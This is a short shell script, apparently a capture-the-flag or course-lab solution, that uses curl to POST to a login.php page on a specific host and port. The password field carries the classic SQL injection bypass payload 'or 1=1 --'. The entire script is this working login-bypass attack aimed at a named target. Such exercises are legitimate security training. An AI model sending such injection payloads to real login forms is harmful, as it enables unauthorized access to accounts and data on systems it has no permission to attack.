#!/bin/sh

curl -X POST http://web.ccns.ncku.edu.tw:34587/login.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=imouto&password='or 1=1 --"
